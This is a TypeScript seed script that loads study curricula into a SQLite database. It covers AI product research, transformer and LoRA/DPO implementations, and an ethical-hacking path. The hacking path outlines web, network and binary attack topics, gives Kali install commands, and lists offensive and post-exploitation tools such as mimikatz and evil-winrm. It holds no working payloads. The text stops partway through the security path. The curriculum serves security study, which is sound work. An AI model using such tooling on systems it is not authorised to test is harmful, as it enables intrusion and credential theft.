import Database from 'better-sqlite3';
import { drizzle } from 'drizzle-orm/better-sqlite3';
import * as schema from '../src/lib/server/schema';

const sqlite = new Database('data/quest-log.db');

// Add columns if they don't exist
try { sqlite.exec(`ALTER TABLE tasks ADD COLUMN details TEXT`); } catch {}
try { sqlite.exec(`ALTER TABLE paths ADD COLUMN schedule TEXT`); } catch {}

const db = drizzle(sqlite, { schema });

interface TaskData {
	title: string;
	description: string;
	details: string;
}

interface ModuleData {
	name: string;
	description: string;
	tasks: TaskData[];
}

interface PathData {
	name: string;
	description: string;
	language: string;
	color: string;
	skills: string;
	startHint: string;
	difficulty: string;
	estimatedWeeks: number;
	schedule: string;
	modules: ModuleData[];
}

const aiPaths: PathData[] = [
	// PATH 1: AI Model Opportunities
	{
		name: 'AI Model Opportunities',
		description: 'Identify, evaluate, and capitalize on AI/ML business opportunities across your project portfolio.',
		language: 'Python',
		color: 'purple',
		skills: 'market analysis, product thinking, API integration, rapid prototyping, business modeling',
		startHint: 'Find a repetitive task you do daily and prototype an AI solution',
		difficulty: 'intermediate',
		estimatedWeeks: 4,
		schedule: `## 4-Week Learning Schedule

### Week 1: Opportunity Recognition
| Day | Focus | Tasks |
|-----|-------|-------|
| Mon | Research | Study 3 successful AI products, document their value props |
| Tue | Research | Study 3 more AI products, identify patterns |
| Wed | Mapping | Map the AI landscape - foundation models, fine-tuned, agents |
| Thu | Ideation | Identify 3 workflows in your domain that could use AI |
| Fri | Analysis | Research API costs, calculate unit economics for top idea |
| Weekend | Review | Consolidate findings, pick top 2 opportunities |

### Week 2: Rapid Prototyping
| Day | Focus | Tasks |
|-----|-------|-------|
| Mon | Setup | Set up Python environment, get API keys |
| Tue | CLI Tool | Build basic CLI that calls LLM API |
| Wed | Prompts | Add system prompts, few-shot examples |
| Thu | Structured Output | Implement JSON mode / function calling |
| Fri | Error Handling | Add retries, fallbacks, rate limit handling |
| Weekend | Testing | Test with real use cases |

### Week 3: Product Validation
| Day | Focus | Tasks |
|-----|-------|-------|
| Mon | UI Setup | Build Streamlit/Gradio interface |
| Tue | Polish | Improve UX, add loading states |
| Wed-Thu | User Testing | Get 5 people to try it, document feedback |
| Fri | Metrics | Measure task completion, time saved |
| Weekend | Iterate | First improvement cycle |

### Week 4: Scaling & Iteration
| Day | Focus | Tasks |
|-----|-------|-------|
| Mon | Caching | Implement response caching |
| Tue | Analytics | Add usage tracking |
| Wed | Evaluation | Compare local vs API models |
| Thu-Fri | Iterate | Second and third improvement cycles |
| Weekend | Documentation | Write up learnings, create playbook |

### Daily Commitment: 2-3 hours`,
		modules: [
			{
				name: 'Opportunity Recognition',
				description: 'Learn to identify where AI creates value',
				tasks: [
					{
						title: 'Study 10 successful AI products and document their value proposition',
						description: 'Analyze products like GitHub Copilot, Midjourney, Jasper',
						details: `## Objective
Analyze 10 successful AI products to understand what makes them valuable.

## Products to Study

| Product | Category | Value Proposition |
|---------|----------|-------------------|
| GitHub Copilot | Developer Tools | Autocomplete for code |
| Midjourney | Creative | Text-to-image generation |
| Jasper | Marketing | AI copywriting |
| Notion AI | Productivity | Document assistance |
| Runway | Video | AI video editing |
| ChatGPT | General | Conversational AI |
| Grammarly | Writing | Grammar and style |
| Canva Magic | Design | AI design tools |
| Synthesia | Video | AI video avatars |
| Copy.ai | Marketing | Content generation |

## For Each Product, Document:

1. **Problem Solved**: What pain point does it address?
2. **Target User**: Who pays for this?
3. **AI Component**: What model/technique powers it?
4. **Moat**: Why can't competitors easily replicate?
5. **Pricing Model**: How do they capture value?

## Analysis Template

\`\`\`markdown
### [Product Name]

**Problem**:
**Solution**:
**AI Tech**:
**Pricing**:
**Key Insight**:
\`\`\`

## Deliverable
A markdown document with analysis of all 10 products and patterns you noticed.`
					},
					{
						title: 'Map the AI landscape: foundation models, fine-tuned models, agents',
						description: 'Understand the different layers of AI products',
						details: `## The AI Stack

\`\`\`
┌─────────────────────────────────────────┐
│           Applications Layer            │
│  (ChatGPT, Copilot, Midjourney, etc.)  │
├─────────────────────────────────────────┤
│           Orchestration Layer           │
│  (LangChain, agents, RAG pipelines)    │
├─────────────────────────────────────────┤
│          Fine-tuned Models              │
│  (LoRA adapters, domain-specific)      │
├─────────────────────────────────────────┤
│          Foundation Models              │
│  (GPT-4, Claude, Llama, Mistral)       │
├─────────────────────────────────────────┤
│          Infrastructure                 │
│  (GPUs, cloud, inference servers)      │
└─────────────────────────────────────────┘
\`\`\`

## Key Concepts

### Foundation Models
- Pre-trained on massive datasets
- General-purpose capabilities
- Examples: GPT-4, Claude, Llama 3, Mistral

### Fine-tuned Models
- Specialized for specific tasks
- Built on foundation models
- Lower cost, faster inference
- Examples: CodeLlama, Phind, domain-specific models

### Agents
- Autonomous AI systems
- Can use tools and take actions
- Chain multiple steps together
- Examples: AutoGPT, CrewAI, custom agents

## Exercise
Create a diagram showing where value is captured at each layer.`
					},
					{
						title: 'Research API costs and calculate unit economics',
						description: 'Price out OpenAI/Anthropic/local model costs per 1000 users',
						details: `## API Pricing Reference (2024)

### OpenAI
| Model | Input (per 1M tokens) | Output (per 1M tokens) |
|-------|----------------------|------------------------|
| GPT-4 Turbo | $10 | $30 |
| GPT-4o | $5 | $15 |
| GPT-3.5 Turbo | $0.50 | $1.50 |

### Anthropic
| Model | Input (per 1M tokens) | Output (per 1M tokens) |
|-------|----------------------|------------------------|
| Claude 3 Opus | $15 | $75 |
| Claude 3 Sonnet | $3 | $15 |
| Claude 3 Haiku | $0.25 | $1.25 |

## Unit Economics Calculator

\`\`\`python
def calculate_cost_per_user(
    avg_requests_per_day: int,
    avg_input_tokens: int,
    avg_output_tokens: int,
    input_cost_per_1m: float,
    output_cost_per_1m: float,
    days: int = 30
) -> dict:
    total_input = avg_requests_per_day * avg_input_tokens * days
    total_output = avg_requests_per_day * avg_output_tokens * days

    input_cost = (total_input / 1_000_000) * input_cost_per_1m
    output_cost = (total_output / 1_000_000) * output_cost_per_1m

    return {
        'monthly_cost_per_user': input_cost + output_cost,
        'cost_per_1000_users': (input_cost + output_cost) * 1000
    }

# Example: Chatbot with 10 requests/day
result = calculate_cost_per_user(
    avg_requests_per_day=10,
    avg_input_tokens=500,
    avg_output_tokens=1000,
    input_cost_per_1m=3.0,  # Claude Sonnet
    output_cost_per_1m=15.0
)
print(f"Monthly cost per user: \${result['monthly_cost_per_user']:.2f}")
\`\`\`

## Local Model Economics
- RTX 4090: ~$1,600, ~150 tokens/sec for 7B model
- Amortized over 2 years = ~$2.20/day
- Compare to API costs for your volume`
					}
				]
			},
			{
				name: 'Rapid Prototyping',
				description: 'Build quick proofs of concept',
				tasks: [
					{
						title: 'Build a CLI tool that uses an LLM API for your top idea',
						description: 'Focus on the core value prop - no UI needed yet',
						details: `## CLI Prototype Template

\`\`\`python
#!/usr/bin/env python3
"""Quick CLI prototype for [YOUR IDEA]"""
import argparse
from anthropic import Anthropic

client = Anthropic()

def process(input_text: str) -> str:
    """Core logic - replace with your value prop."""
    response = client.messages.create(
        model="claude-3-sonnet-20240229",
        max_tokens=1024,
        system="You are a helpful assistant that...",
        messages=[{"role": "user", "content": input_text}]
    )
    return response.content[0].text

def main():
    parser = argparse.ArgumentParser(description='[Your tool]')
    parser.add_argument('input', help='Input to process')
    parser.add_argument('--verbose', '-v', action='store_true')
    args = parser.parse_args()

    result = process(args.input)
    print(result)

if __name__ == "__main__":
    main()
\`\`\`

## Key Principles
1. **Single file** - No complex project structure yet
2. **Hardcoded config** - Iterate on prompts first
3. **Print output** - No databases, no files, just stdout
4. **Manual testing** - Run it 20+ times with different inputs

## Iteration Loop
\`\`\`
1. Run with test input
2. Evaluate output quality
3. Adjust system prompt
4. Repeat until 80%+ good outputs
\`\`\``
					},
					{
						title: 'Add prompt engineering: system prompts, few-shot examples',
						description: 'Iterate on prompts to improve reliability',
						details: `## Prompt Engineering Techniques

### 1. System Prompts
\`\`\`python
SYSTEM_PROMPT = """You are an expert [ROLE] that helps users [TASK].

Guidelines:
- Always [CONSTRAINT 1]
- Never [CONSTRAINT 2]
- Format output as [FORMAT]

When uncertain, ask clarifying questions."""
\`\`\`

### 2. Few-Shot Examples
\`\`\`python
FEW_SHOT_EXAMPLES = """
Example 1:
Input: [example input]
Output: [example output]

Example 2:
Input: [example input]
Output: [example output]
"""

prompt = f"{FEW_SHOT_EXAMPLES}\\n\\nNow process this:\\nInput: {user_input}"
\`\`\`

### 3. Output Parsing
\`\`\`python
import json
import re

def parse_structured_output(response: str) -> dict:
    """Extract JSON from model response."""
    json_match = re.search(r'\`\`\`json\\n(.+?)\\n\`\`\`', response, re.DOTALL)
    if json_match:
        return json.loads(json_match.group(1))
    try:
        return json.loads(response)
    except:
        return {"raw": response}
\`\`\`

### 4. Chain of Thought
\`\`\`python
COT_PROMPT = """Let's solve this step by step:

1. First, I'll analyze...
2. Then, I'll consider...
3. Finally, I'll...

[Your actual question]"""
\`\`\``
					},
					{
						title: 'Implement structured output with JSON mode or function calling',
						description: 'Make the AI output parseable and actionable data',
						details: `## Structured Output Methods

### Method 1: JSON Mode (OpenAI)
\`\`\`python
from openai import OpenAI
client = OpenAI()

response = client.chat.completions.create(
    model="gpt-4-turbo-preview",
    response_format={"type": "json_object"},
    messages=[
        {"role": "system", "content": "Output valid JSON only."},
        {"role": "user", "content": "Extract entities from: ..."}
    ]
)
data = json.loads(response.choices[0].message.content)
\`\`\`

### Method 2: Tool Use (Anthropic)
\`\`\`python
from anthropic import Anthropic

tools = [{
    "name": "extract_data",
    "description": "Extract structured data from text",
    "input_schema": {
        "type": "object",
        "properties": {
            "entities": {"type": "array", "items": {"type": "string"}},
            "sentiment": {"type": "string", "enum": ["positive", "negative", "neutral"]}
        },
        "required": ["entities", "sentiment"]
    }
}]

response = client.messages.create(
    model="claude-3-sonnet-20240229",
    max_tokens=1024,
    tools=tools,
    messages=[{"role": "user", "content": "Analyze: ..."}]
)

for block in response.content:
    if block.type == "tool_use":
        data = block.input
\`\`\`

### Method 3: Pydantic Validation
\`\`\`python
from pydantic import BaseModel
from typing import List

class ExtractedData(BaseModel):
    entities: List[str]
    sentiment: str
    confidence: float

def validate_output(raw_json: str) -> ExtractedData:
    return ExtractedData.model_validate_json(raw_json)
\`\`\``
					}
				]
			},
			{
				name: 'Project Analysis',
				description: 'Apply ML to specific project domains',
				tasks: [
					{
						title: 'Analyze trading signal data for ML opportunities (Invest-IQ)',
						description: 'Build signal quality prediction model',
						details: `## Trading Signal Quality Prediction

### Data Pipeline
\`\`\`
┌─────────────────┐     ┌─────────────────┐     ┌─────────────────┐
│  Raw Signals    │────▶│ Feature Extract │────▶│  Training Data  │
│  (portfolio.db) │     │                 │     │                 │
└─────────────────┘     └─────────────────┘     └─────────────────┘
                                                        │
                                                        ▼
┌─────────────────┐     ┌─────────────────┐     ┌─────────────────┐
│   Prediction    │◀────│  Trained Model  │◀────│  Model Training │
│   API Endpoint  │     │  (XGBoost)      │     │  (scikit-learn) │
└─────────────────┘     └─────────────────┘     └─────────────────┘
\`\`\`

### Features to Engineer
\`\`\`python
features = {
    'signal_strength': float,
    'entry_price': float,
    'stop_loss_distance': float,
    'take_profit_distance': float,
    'symbol_win_rate_30d': float,
    'strategy_win_rate_30d': float,
    'sector_momentum': float,
    'vix_level': float,
    'spy_trend': int,
    'days_since_earnings': int,
    'hour_of_day': int,
    'day_of_week': int,
}
\`\`\`

### Models to Train
| Model | Purpose | Target | Metric |
|-------|---------|--------|--------|
| XGBoost Classifier | Signal quality | Binary win/loss | AUC-ROC > 0.65 |
| XGBoost Regressor | Expected return | % return | MAE < 2% |
| LSTM | Volatility forecast | Next-day vol | RMSE < 0.5% |`
					},
					{
						title: 'Build CS2 match prediction model (Silver-Casts)',
						description: 'Predict match outcomes using historical data',
						details: `## CS2 Match Prediction

### Features to Engineer
\`\`\`python
team_features = {
    'avg_rating': float,
    'avg_adr': float,
    'avg_kast': float,
    'team_win_rate_30d': float,
    'map_win_rate': float,
    'map_ct_win_rate': float,
    'map_t_win_rate': float,
    'h2h_record': float,
    'h2h_round_diff': float,
    'last_5_win_rate': float,
    'days_since_last_match': int,
}

match_features = {
    'rating_diff': float,
    'map_advantage': float,
    'elo_diff': float,
    'is_bo3': bool,
    'is_lan': bool,
}
\`\`\`

### Training Script
\`\`\`python
import pandas as pd
from sklearn.ensemble import GradientBoostingClassifier
import sqlite3

conn = sqlite3.connect('cs2_matches.db')
matches = pd.read_sql('''
    SELECT m.*, t1.avg_rating as team1_rating, t2.avg_rating as team2_rating
    FROM matches m
    JOIN team_stats t1 ON m.team1_id = t1.team_id
    JOIN team_stats t2 ON m.team2_id = t2.team_id
''', conn)

model = GradientBoostingClassifier(n_estimators=100)
# Train with cross-validation...
\`\`\`

### Target Metrics
| Model | Purpose | Target |
|-------|---------|--------|
| XGBoost | Match winner | Accuracy > 60% |
| Neural Net | Round score | MAE < 3 rounds |`
					}
				]
			}
		]
	},
	// PATH 2: Transformers & LLMs Deep Dive
	{
		name: 'Transformers & LLMs Deep Dive',
		description: 'Master transformer architecture and large language models from theory to implementation.',
		language: 'Python',
		color: 'blue',
		skills: 'attention mechanisms, tokenization, fine-tuning, inference optimization, prompt engineering',
		startHint: 'Implement scaled dot-product attention from scratch before using libraries',
		difficulty: 'advanced',
		estimatedWeeks: 8,
		schedule: `## 8-Week Learning Schedule

### Weeks 1-2: Attention Mechanism
| Week | Day | Focus |
|------|-----|-------|
| W1 | Mon-Tue | Implement scaled dot-product attention from scratch |
| W1 | Wed-Thu | Build multi-head attention |
| W1 | Fri-Sat | Position encodings (sinusoidal and learned) |
| W2 | Mon-Wed | Full transformer encoder block |
| W2 | Thu-Sat | Transformer decoder with causal masking |

### Weeks 3-4: Tokenization & Pre-training
| Week | Day | Focus |
|------|-----|-------|
| W3 | Mon-Tue | Implement BPE tokenizer from scratch |
| W3 | Wed-Thu | Compare tokenization methods (BPE, WordPiece) |
| W3 | Fri-Sat | Study tokenizer edge cases |
| W4 | Mon-Wed | Implement causal language modeling |
| W4 | Thu-Sat | Train a small LM on text corpus |

### Weeks 5-6: Fine-tuning
| Week | Day | Focus |
|------|-----|-------|
| W5 | Mon-Wed | Full fine-tuning on classification task |
| W5 | Thu-Sat | Implement LoRA from scratch |
| W6 | Mon-Wed | QLoRA with quantization |
| W6 | Thu-Sat | Instruction tuning basics |

### Weeks 7-8: Inference & Applications
| Week | Day | Focus |
|------|-----|-------|
| W7 | Mon-Tue | KV-cache implementation |
| W7 | Wed-Thu | Sampling strategies (top-k, top-p) |
| W7 | Fri-Sat | Quantization (INT8, INT4) |
| W8 | Mon-Wed | Build RAG system |
| W8 | Thu-Sat | Agent with tool use |

### Daily Commitment: 3-4 hours`,
		modules: [
			{
				name: 'Attention Mechanism',
				description: 'Deep understanding of the core transformer operation',
				tasks: [
					{
						title: 'Implement scaled dot-product attention from scratch',
						description: 'Q, K, V matrices, scaling, softmax, weighted sum',
						details: `## Scaled Dot-Product Attention

The core operation of transformers:
\`\`\`
Attention(Q, K, V) = softmax(QK^T / √d_k) V
\`\`\`

Where:
- **Q (Query)**: What am I looking for?
- **K (Key)**: What do I contain?
- **V (Value)**: What information do I provide?
- **d_k**: Dimension of keys (scaling factor)

## Implementation

\`\`\`python
import torch
import torch.nn.functional as F
import math

def scaled_dot_product_attention(query, key, value, mask=None):
    """
    Args:
        query: (batch, heads, seq_len, d_k)
        key: (batch, heads, seq_len, d_k)
        value: (batch, heads, seq_len, d_v)
        mask: (batch, 1, 1, seq_len)
    """
    d_k = query.size(-1)

    # Compute attention scores
    scores = torch.matmul(query, key.transpose(-2, -1)) / math.sqrt(d_k)

    # Apply mask
    if mask is not None:
        scores = scores.masked_fill(mask == 0, float('-inf'))

    # Softmax over the last dimension
    attention_weights = F.softmax(scores, dim=-1)

    # Weighted sum of values
    output = torch.matmul(attention_weights, value)

    return output, attention_weights
\`\`\`

## Why Scale by √d_k?
Without scaling, dot products grow large with dimension, pushing softmax into regions with tiny gradients.

## Exercise
1. Implement attention without using F.softmax
2. Visualize attention weights for a sample input
3. Verify gradients flow correctly`
					},
					{
						title: 'Implement multi-head attention',
						description: 'Parallel attention heads, concatenation, projection',
						details: `## Multi-Head Attention

Instead of one attention function, we project Q, K, V multiple times:
\`\`\`
MultiHead(Q, K, V) = Concat(head_1, ..., head_h) W^O
where head_i = Attention(QW_i^Q, KW_i^K, VW_i^V)
\`\`\`

## Implementation

\`\`\`python
import torch.nn as nn

class MultiHeadAttention(nn.Module):
    def __init__(self, d_model, num_heads, dropout=0.1):
        super().__init__()
        assert d_model % num_heads == 0

        self.d_model = d_model
        self.num_heads = num_heads
        self.d_k = d_model // num_heads

        self.W_q = nn.Linear(d_model, d_model)
        self.W_k = nn.Linear(d_model, d_model)
        self.W_v = nn.Linear(d_model, d_model)
        self.W_o = nn.Linear(d_model, d_model)
        self.dropout = nn.Dropout(dropout)

    def forward(self, query, key, value, mask=None):
        batch_size = query.size(0)

        # Linear projections
        Q = self.W_q(query).view(batch_size, -1, self.num_heads, self.d_k).transpose(1, 2)
        K = self.W_k(key).view(batch_size, -1, self.num_heads, self.d_k).transpose(1, 2)
        V = self.W_v(value).view(batch_size, -1, self.num_heads, self.d_k).transpose(1, 2)

        # Apply attention
        attn_output, _ = scaled_dot_product_attention(Q, K, V, mask)

        # Concatenate and project
        attn_output = attn_output.transpose(1, 2).contiguous().view(batch_size, -1, self.d_model)
        return self.dropout(self.W_o(attn_output))
\`\`\`

## Why Multiple Heads?
Each head can learn to attend to different aspects:
- Head 1: Syntactic relationships
- Head 2: Semantic similarity
- Head 3: Positional patterns`
					},
					{
						title: 'Build position encodings (sinusoidal and learned)',
						description: 'Understand why position information is needed',
						details: `## Why Position Encodings?

Transformers have no inherent notion of sequence order. Without position information, "dog bites man" = "man bites dog".

## Sinusoidal Position Encoding

\`\`\`python
class SinusoidalPositionalEncoding(nn.Module):
    def __init__(self, d_model, max_len=5000):
        super().__init__()

        pe = torch.zeros(max_len, d_model)
        position = torch.arange(0, max_len, dtype=torch.float).unsqueeze(1)
        div_term = torch.exp(torch.arange(0, d_model, 2).float() * (-math.log(10000.0) / d_model))

        pe[:, 0::2] = torch.sin(position * div_term)
        pe[:, 1::2] = torch.cos(position * div_term)

        pe = pe.unsqueeze(0)
        self.register_buffer('pe', pe)

    def forward(self, x):
        return x + self.pe[:, :x.size(1), :]
\`\`\`

## Rotary Position Embeddings (RoPE)
Used in Llama, Mistral - encodes position by rotating query/key vectors.

## Comparison
| Method | Extrapolation | Parameters | Modern Use |
|--------|--------------|------------|------------|
| Sinusoidal | Good | 0 | Rare |
| Learned | Poor | O(max_len) | GPT-2 |
| RoPE | Excellent | 0 | Llama, Mistral |`
					}
				]
			},
			{
				name: 'Transformer Architecture',
				description: 'Build complete transformer blocks',
				tasks: [
					{
						title: 'Implement a full transformer encoder block',
						description: 'Attention, layer norm, feed-forward, residual connections',
						details: `## Transformer Block Architecture

\`\`\`
Input
  │
  ├──────────────┐
  ▼              │
LayerNorm        │
  │              │
  ▼              │
Multi-Head       │
Attention        │
  │              │
  └──────► + ◄───┘  (Residual)
           │
  ├────────┴───────┐
  ▼                │
LayerNorm          │
  │                │
  ▼                │
Feed-Forward       │
  │                │
  └──────► + ◄─────┘  (Residual)
           │
           ▼
        Output
\`\`\`

## Implementation (Pre-Norm Style)

\`\`\`python
class TransformerBlock(nn.Module):
    def __init__(self, d_model, num_heads, d_ff, dropout=0.1):
        super().__init__()
        self.norm1 = nn.LayerNorm(d_model)
        self.norm2 = nn.LayerNorm(d_model)
        self.attention = MultiHeadAttention(d_model, num_heads, dropout)
        self.ffn = nn.Sequential(
            nn.Linear(d_model, d_ff),
            nn.GELU(),
            nn.Dropout(dropout),
            nn.Linear(d_ff, d_model),
            nn.Dropout(dropout)
        )

    def forward(self, x, mask=None):
        # Pre-norm + attention + residual
        x = x + self.attention(self.norm1(x), self.norm1(x), self.norm1(x), mask)
        # Pre-norm + FFN + residual
        x = x + self.ffn(self.norm2(x))
        return x
\`\`\`

## Pre-Norm vs Post-Norm
**Post-Norm** (original): Harder to train deep networks
**Pre-Norm** (modern): More stable gradients, used in GPT-2, Llama`
					},
					{
						title: 'Implement a transformer decoder with causal masking',
						description: 'Autoregressive generation, masked self-attention',
						details: `## Causal (Autoregressive) Attention

Each position can only attend to previous positions:
\`\`\`
Attention Pattern (4 tokens):
     t1  t2  t3  t4
t1 [  1   0   0   0 ]
t2 [  1   1   0   0 ]
t3 [  1   1   1   0 ]
t4 [  1   1   1   1 ]
\`\`\`

## Implementation

\`\`\`python
class CausalSelfAttention(nn.Module):
    def __init__(self, d_model, num_heads, max_seq_len, dropout=0.1):
        super().__init__()
        self.num_heads = num_heads
        self.d_k = d_model // num_heads

        self.qkv_proj = nn.Linear(d_model, 3 * d_model, bias=False)
        self.out_proj = nn.Linear(d_model, d_model, bias=False)
        self.dropout = nn.Dropout(dropout)

        # Pre-compute causal mask
        mask = torch.tril(torch.ones(max_seq_len, max_seq_len))
        self.register_buffer('mask', mask.view(1, 1, max_seq_len, max_seq_len))

    def forward(self, x):
        B, T, C = x.size()

        qkv = self.qkv_proj(x)
        q, k, v = qkv.split(C, dim=2)

        q = q.view(B, T, self.num_heads, self.d_k).transpose(1, 2)
        k = k.view(B, T, self.num_heads, self.d_k).transpose(1, 2)
        v = v.view(B, T, self.num_heads, self.d_k).transpose(1, 2)

        scores = (q @ k.transpose(-2, -1)) / math.sqrt(self.d_k)
        scores = scores.masked_fill(self.mask[:, :, :T, :T] == 0, float('-inf'))
        attn = F.softmax(scores, dim=-1)
        attn = self.dropout(attn)

        out = attn @ v
        out = out.transpose(1, 2).contiguous().view(B, T, C)
        return self.out_proj(out)
\`\`\``
					},
					{
						title: 'Build a complete GPT-style model',
						description: 'Token embeddings, transformer blocks, output projection',
						details: `## Complete GPT Model

\`\`\`python
class GPTModel(nn.Module):
    def __init__(self, config):
        super().__init__()
        self.config = config

        self.token_embedding = nn.Embedding(config.vocab_size, config.d_model)
        self.position_embedding = nn.Embedding(config.max_seq_len, config.d_model)
        self.dropout = nn.Dropout(config.dropout)

        self.blocks = nn.ModuleList([
            TransformerBlock(config.d_model, config.num_heads, config.d_ff)
            for _ in range(config.num_layers)
        ])

        self.ln_f = nn.LayerNorm(config.d_model)
        self.lm_head = nn.Linear(config.d_model, config.vocab_size, bias=False)

        # Weight tying
        self.token_embedding.weight = self.lm_head.weight

    def forward(self, idx, targets=None):
        B, T = idx.size()

        tok_emb = self.token_embedding(idx)
        pos_emb = self.position_embedding(torch.arange(T, device=idx.device))
        x = self.dropout(tok_emb + pos_emb)

        for block in self.blocks:
            x = block(x)

        x = self.ln_f(x)
        logits = self.lm_head(x)

        loss = None
        if targets is not None:
            loss = F.cross_entropy(logits.view(-1, logits.size(-1)), targets.view(-1))

        return logits, loss

    @torch.no_grad()
    def generate(self, idx, max_new_tokens, temperature=1.0, top_k=None):
        for _ in range(max_new_tokens):
            idx_cond = idx[:, -self.config.max_seq_len:]
            logits, _ = self(idx_cond)
            logits = logits[:, -1, :] / temperature

            if top_k is not None:
                v, _ = torch.topk(logits, min(top_k, logits.size(-1)))
                logits[logits < v[:, [-1]]] = float('-inf')

            probs = F.softmax(logits, dim=-1)
            idx_next = torch.multinomial(probs, num_samples=1)
            idx = torch.cat((idx, idx_next), dim=1)

        return idx
\`\`\`

## Model Sizes
| Model | d_model | layers | heads | params |
|-------|---------|--------|-------|--------|
| GPT-2 Small | 768 | 12 | 12 | 124M |
| Llama 7B | 4096 | 32 | 32 | 7B |
| Llama 70B | 8192 | 80 | 64 | 70B |`
					}
				]
			},
			{
				name: 'Fine-Tuning & RLHF',
				description: 'Adapt models for specific tasks',
				tasks: [
					{
						title: 'Implement LoRA from scratch',
						description: 'Low-rank adaptation for efficient fine-tuning',
						details: `## LoRA: Low-Rank Adaptation

Freeze original weights, train low-rank A and B matrices:
\`\`\`
W_new = W_original + (B @ A) * scaling
\`\`\`

## Implementation

\`\`\`python
class LoRALinear(nn.Module):
    def __init__(self, original_layer, rank=8, alpha=16):
        super().__init__()
        self.original = original_layer
        self.original.requires_grad_(False)

        in_features = original_layer.in_features
        out_features = original_layer.out_features

        self.lora_A = nn.Parameter(torch.zeros(rank, in_features))
        self.lora_B = nn.Parameter(torch.zeros(out_features, rank))

        nn.init.kaiming_uniform_(self.lora_A, a=math.sqrt(5))
        nn.init.zeros_(self.lora_B)

        self.scaling = alpha / rank

    def forward(self, x):
        original_output = self.original(x)
        lora_output = (x @ self.lora_A.T @ self.lora_B.T) * self.scaling
        return original_output + lora_output

    def merge_weights(self):
        self.original.weight.data += (self.lora_B @ self.lora_A) * self.scaling
\`\`\`

## Benefits
- 0.1-1% of original parameters
- Original weights unchanged
- Faster training, lower memory`
					},
					{
						title: 'Implement DPO (Direct Preference Optimization)',
						description: 'Simpler alternative to full RLHF pipeline',
						details: `## DPO: Direct Preference Optimization

Skip reward model, directly optimize preferences:

\`\`\`python
def dpo_loss(policy_model, ref_model, chosen_ids, rejected_ids, beta=0.1):
    """
    Loss = -log σ(β * (log π(chosen)/π_ref(chosen) - log π(rejected)/π_ref(rejected)))
    """
    # Policy log probs
    policy_chosen_logps = get_sequence_logprobs(policy_model, chosen_ids)
    policy_rejected_logps = get_sequence_logprobs(policy_model, rejected_ids)

    # Reference log probs (frozen)
    with torch.no_grad():
        ref_chosen_logps = get_sequence_logprobs(ref_model, chosen_ids)
        ref_rejected_logps = get_sequence_logprobs(ref_model, rejected_ids)

    # DPO loss
    chosen_rewards = beta * (policy_chosen_logps - ref_chosen_logps)
    rejected_rewards = beta * (policy_rejected_logps - ref_rejected_logps)

    loss = -F.logsigmoid(chosen_rewards - rejected_rewards).mean()
    return loss

def get_sequence_logprobs(model, input_ids):
    outputs = model(input_ids)
    logits = outputs.logits[:, :-1, :]
    labels = input_ids[:, 1:]

    log_probs = F.log_softmax(logits, dim=-1)
    selected = torch.gather(log_probs, 2, labels.unsqueeze(-1)).squeeze(-1)
    return selected.sum(dim=-1)
\`\`\`

## Advantages over RLHF
- No reward model needed
- Single training phase
- More stable optimization`
					}
				]
			}
		]
	},
	// PATH 3: Ethical Hacking & Security
	{
		name: 'Ethical Hacking & Security',
		description: 'Learn offensive security to build better defenses. A 3-month intensive curriculum for red team skills.',
		language: 'Python',
		color: 'rose',
		skills: 'network protocols, reverse engineering, vulnerability analysis, secure coding, CTF skills',
		startHint: 'Set up a vulnerable VM (DVWA or HackTheBox) and complete your first CTF challenge',
		difficulty: 'advanced',
		estimatedWeeks: 12,
		schedule: `## 12-Week Learning Schedule

### Weeks 1-2: Foundations
| Week | Focus | Activities |
|------|-------|------------|
| W1 | Environment Setup | Install Kali Linux, configure tools |
| W1 | Networking | Study OSI model, TCP/IP, HTTP, DNS |
| W2 | Wireshark | Packet analysis, capture traffic |
| W2 | CTF Practice | Complete 5 beginner challenges |

### Weeks 3-5: Web Application Security
| Week | Focus | Activities |
|------|-------|------------|
| W3 | SQL Injection | UNION, blind, time-based attacks |
| W4 | XSS | Reflected, stored, DOM-based |
| W5 | Other Web | CSRF, SSRF, auth bypasses, Burp Suite |

### Weeks 6-8: Network Security
| Week | Focus | Activities |
|------|-------|------------|
| W6 | Reconnaissance | nmap scanning, service enumeration |
| W7 | Exploitation | Common service misconfigs (SSH, FTP, SMB) |
| W8 | MITM | ARP spoofing, firewall configuration |

### Weeks 9-10: Binary Exploitation
| Week | Focus | Activities |
|------|-------|------------|
| W9 | Memory Layout | Stack, heap, segments |
| W9 | Buffer Overflow | Basic exploits, stack canaries |
| W10 | ROP | Return-oriented programming basics |
| W10 | Tools | GDB, pwntools |

### Weeks 11-12: Secure Coding
| Week | Focus | Activities |
|------|-------|------------|
| W11 | Auth Security | Password hashing, MFA, sessions |
| W12 | Defense | Input validation, CSP, logging |

### Daily Commitment: 2-3 hours + weekend CTF practice`,
		modules: [
			{
				name: 'Foundations',
				description: 'Core security concepts and lab setup',
				tasks: [
					{
						title: 'Set up Kali Linux VM and essential tools',
						description: 'Configure virtualization, networking, and core toolset',
						details: `## Lab Setup Requirements

### Hardware
- 32GB RAM minimum (64GB preferred)
- 500GB SSD
- Virtualization support enabled in BIOS

### Software Options
- VMware Workstation Pro
- VirtualBox (free)
- Proxmox (for dedicated server)

## Kali Linux Installation

\`\`\`bash
# Download from kali.org/get-kali/
# Create VM with:
# - 4+ CPU cores
# - 8GB+ RAM
# - 80GB disk

# Post-install updates
sudo apt update && sudo apt full-upgrade -y

# Install additional tools
sudo apt install -y \\
    gobuster seclists bloodhound neo4j \\
    crackmapexec evil-winrm chisel
\`\`\`

## Network Configuration
\`\`\`
┌─────────────────────────────────────────┐
│           Internal Network               │
│             10.0.0.0/24                  │
│  ┌─────────┐  ┌─────────┐  ┌─────────┐  │
│  │  Kali   │  │ Target  │  │ Target  │  │
│  │10.0.0.5 │  │10.0.0.10│  │10.0.0.11│  │
│  └─────────┘  └─────────┘  └─────────┘  │
└─────────────────────────────────────────┘
\`\`\`

## Essential Tools Checklist
| Category | Tools |
|----------|-------|
| Recon | nmap, masscan, amass, subfinder |
| Web | burp suite, ffuf, sqlmap, nikto |
| Exploitation | metasploit, searchsploit |
| Post-Exploit | mimikatz, bloodhound, impacket |
| Passwords | hashcat, john, hydra |`
					},
					{
						title: 'Study the OSI model and common protocols',
						description: 'Understand how data flows across networks',
						details: `## OSI Model for Hackers

\`\`\`
Layer 7 - Application   HTTP, DNS, SSH, FTP
Layer 6 - Presentation  SSL/TLS, encoding
Layer 5 - Session       NetBIOS, RPC
Layer 4 - Transport     TCP, UDP
Layer 3 - Network       IP, ICMP, routing
Layer 2 - Data Link     Ethernet, ARP, MAC
Layer 1 - Physical      Cables, signals
\`\`\`

## Key Protocols

